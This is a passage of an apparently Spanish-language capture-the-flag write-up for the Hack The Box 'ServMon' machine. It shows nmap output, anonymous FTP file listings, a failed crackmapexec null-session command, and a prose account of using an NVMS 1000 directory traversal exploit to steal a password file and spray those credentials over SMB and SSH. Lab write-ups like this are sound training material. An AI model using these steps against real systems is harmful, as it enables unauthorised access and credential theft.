&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.91 scan initiated Wed May 12 19:53:55 2021 as: nmap -Pn -p21,22,80,135,139,445,5040,5666,6063,6699,7680,49664,49665,49666,49667,49668,49669,49670 -sC -sV -oN port_scan 10.10.10.184&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.184 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.10.184&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.096s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ftp-anon: Anonymous FTP login allowed &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;FTP code 230&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_01-18-20  12:05PM       &amp;lt;DIR&amp;gt;          Users
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ftp-syst:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_7.7 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp    open  http
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; fingerprint-strings:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   GetRequest, HTTPOptions, RTSPRequest:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     HTTP/1.1 &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-type: text/html
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Length: &lt;span class=&#34;m&#34;&gt;340&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Connection: close
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     AuthInfo:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;!DOCTYPE html PUBLIC &lt;span class=&#34;s2&#34;&gt;&amp;#34;-//W3C//DTD XHTML 1.0 Transitional//EN&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;html &lt;span class=&#34;nv&#34;&gt;xmlns&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://www.w3.org/1999/xhtml&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;head&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;script &lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;text/javascript&amp;#34;&lt;/span&gt;&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     window.location.href &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Pages/login.htm&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;/script&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;/head&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;body&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;/body&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &amp;lt;/html&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   NULL:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     HTTP/1.1 &lt;span class=&#34;m&#34;&gt;408&lt;/span&gt; Request Timeout
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-type: text/html
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Content-Length: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Connection: close
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    AuthInfo:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Site doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t have a title &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;text/html&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5666/tcp  open  tcpwrapped
6063/tcp  open  tcpwrapped
6699/tcp  open  napster?
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7.91%I&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;7%D&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;5/12%Time&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;609C6A98%P&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;NULL
SF:,6B,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\r\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;GetRequest,1B4,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20\r\n\r\n\xef\xbb\xbf&amp;lt;!DOCTYPE\x20html\x20PUBLIC\x20\&amp;#34;-//W3C//DTD\x20X
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:HTML\x201\.0\x20Transitional//EN\&amp;#34;\x20\&amp;#34;http://www\.w3\.org/TR/xhtml1/D
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:TD/xhtml1-transitional\.dtd\&amp;#34;&amp;gt;\r\n\r\n&amp;lt;html\x20xmlns=\&amp;#34;http://www\.w3\.
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:org/1999/xhtml\&amp;#34;&amp;gt;\r\n&amp;lt;head&amp;gt;\r\n\x20\x20\x20\x20&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;\r\n\x20\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:x20\x20\x20&amp;lt;script\x20type=\&amp;#34;text/javascript\&amp;#34;&amp;gt;\r\n\x20\x20\x20\x20\x20
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\x20\x20\x20window\.location\.href\x20=\x20\&amp;#34;Pages/login\.htm\&amp;#34;;\r\n\x2
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0\x20\x20\x20&amp;lt;/script&amp;gt;\r\n&amp;lt;/head&amp;gt;\r\n&amp;lt;body&amp;gt;\r\n&amp;lt;/body&amp;gt;\r\n&amp;lt;/html&amp;gt;\r\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
SF:%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HTTPOptions,1B4,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:n\r\n\xef\xbb\xbf&amp;lt;!DOCTYPE\x20html\x20PUBLIC\x20\&amp;#34;-//W3C//DTD\x20XHTML\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:x201\.0\x20Transitional//EN\&amp;#34;\x20\&amp;#34;http://www\.w3\.org/TR/xhtml1/DTD/xh
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:tml1-transitional\.dtd\&amp;#34;&amp;gt;\r\n\r\n&amp;lt;html\x20xmlns=\&amp;#34;http://www\.w3\.org/1
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:999/xhtml\&amp;#34;&amp;gt;\r\n&amp;lt;head&amp;gt;\r\n\x20\x20\x20\x20&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;\r\n\x20\x20\x
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20\x20&amp;lt;script\x20type=\&amp;#34;text/javascript\&amp;#34;&amp;gt;\r\n\x20\x20\x20\x20\x20\x20\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:x20\x20window\.location\.href\x20=\x20\&amp;#34;Pages/login\.htm\&amp;#34;;\r\n\x20\x20
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\x20\x20&amp;lt;/script&amp;gt;\r\n&amp;lt;/head&amp;gt;\r\n&amp;lt;body&amp;gt;\r\n&amp;lt;/body&amp;gt;\r\n&amp;lt;/html&amp;gt;\r\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;%r&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RT
SF:SPRequest,1B4,&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\n
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:Content-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:\xef\xbb\xbf&amp;lt;!DOCTYPE\x20html\x20PUBLIC\x20\&amp;#34;-//W3C//DTD\x20XHTML\x201\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:.0\x20Transitional//EN\&amp;#34;\x20\&amp;#34;http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:transitional\.dtd\&amp;#34;&amp;gt;\r\n\r\n&amp;lt;html\x20xmlns=\&amp;#34;http://www\.w3\.org/1999/x
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:html\&amp;#34;&amp;gt;\r\n&amp;lt;head&amp;gt;\r\n\x20\x20\x20\x20&amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;\r\n\x20\x20\x20\x2
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:0&amp;lt;script\x20type=\&amp;#34;text/javascript\&amp;#34;&amp;gt;\r\n\x20\x20\x20\x20\x20\x20\x20\x
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:20window\.location\.href\x20=\x20\&amp;#34;Pages/login\.htm\&amp;#34;;\r\n\x20\x20\x20\
&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;SF:x20&amp;lt;/script&amp;gt;\r\n&amp;lt;/head&amp;gt;\r\n&amp;lt;body&amp;gt;\r\n&amp;lt;/body&amp;gt;\r\n&amp;lt;/html&amp;gt;\r\n&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
Service Info: OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: 4m17s
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled but not required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2021-05-13T00:00:59
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed May 12 19:57:10 2021 -- 1 IP address (1 host up) scanned in 195.09 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;ftp&#34;&gt;FTP&lt;/h1&gt;
&lt;p&gt;En el servicio FTP encontramos dos archivos en las carpetas de los usuarios &lt;code&gt;Nadine&lt;/code&gt; y &lt;code&gt;Nathan&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ftp&amp;gt; dir
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful.
&lt;span class=&#34;m&#34;&gt;125&lt;/span&gt; Data connection already open&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Transfer starting.
01-18-20  12:06PM       &amp;lt;DIR&amp;gt;          Nadine
01-18-20  12:08PM       &amp;lt;DIR&amp;gt;          Nathan
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
ftp&amp;gt; dir Nadine
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful.
&lt;span class=&#34;m&#34;&gt;125&lt;/span&gt; Data connection already open&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Transfer starting.
01-18-20  12:08PM                  &lt;span class=&#34;m&#34;&gt;174&lt;/span&gt; Confidential.txt
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
ftp&amp;gt; dir Nathan
&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful.
&lt;span class=&#34;m&#34;&gt;125&lt;/span&gt; Data connection already open&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Transfer starting.
01-18-20  12:10PM                  &lt;span class=&#34;m&#34;&gt;186&lt;/span&gt; Notes to &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;.txt
&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
ftp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El primer archivo indica que la contrase√±a de Nathan esta en el escritorio y en el archivo &lt;code&gt;Passwords.txt&lt;/code&gt;. En el segundo archivo se listan cosas por hacer.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;œÄ ~/htb/servmon ‚ùØ cat Confidential.txt
Nathan,

I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine

œÄ ~/htb/servmon ‚ùØ cat Notes&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;to&lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;.txt
1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Change the password &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; NVMS - Complete
2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Lock down the NSClient Access - Complete
3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Upload the passwords
4&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Remove public access to NVMS
5&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Place the secret files in SharePoint
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;smb&#34;&gt;SMB&lt;/h1&gt;
&lt;p&gt;Intentamos listar los recursos compartidos con una sesion nula pero no tenemos acceso.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;œÄ ~/htb/servmon ‚ùØ cme smb 10.10.10.184 -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; --shares
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span class=&#34;m&#34;&gt;18362&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:SERVMON&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:ServMon&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt; STATUS_ACCESS_DENIED
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;nadine---user&#34;&gt;NADINE - USER&lt;/h1&gt;
&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos un login de &lt;strong&gt;NVMS 1000&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/2021-05-1218_21_10-Window.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;nvms-1000---directory-traversal&#34;&gt;NVMS 1000 - Directory Traversal&lt;/h2&gt;
&lt;p&gt;Realizamos una busqueda de vulnerabilidades en NVMS y vemos un &lt;a href=&#34;https://www.exploit-db.com/exploits/47774&#34;&gt;exploit&lt;/a&gt; que indica una vulnerabilidad &lt;strong&gt;Directory Traversal&lt;/strong&gt;, tambien vemos el &lt;a href=&#34;https://www.exploit-db.com/exploits/48311&#34;&gt;exploit&lt;/a&gt; que realiza la &amp;ldquo;explotacion&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;En una de las notas indica que existe un archivo en el escritorio de uno de los usuarios, realizamos una solicitud a ese archivo y encontramos varias contrase√±as.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/2021-05-1218_32_00-Window.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos &lt;strong&gt;crackmapexec&lt;/strong&gt; con una peque√±a lista de usuarios y contrase√±as al servicio smb, logramos encontrar las correctas aunque no vemos ningun recurso en samba, por lo que verificamos en SSH y logramos ver que la contrase√±a es aceptada con el usuario &lt;code&gt;nadine&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
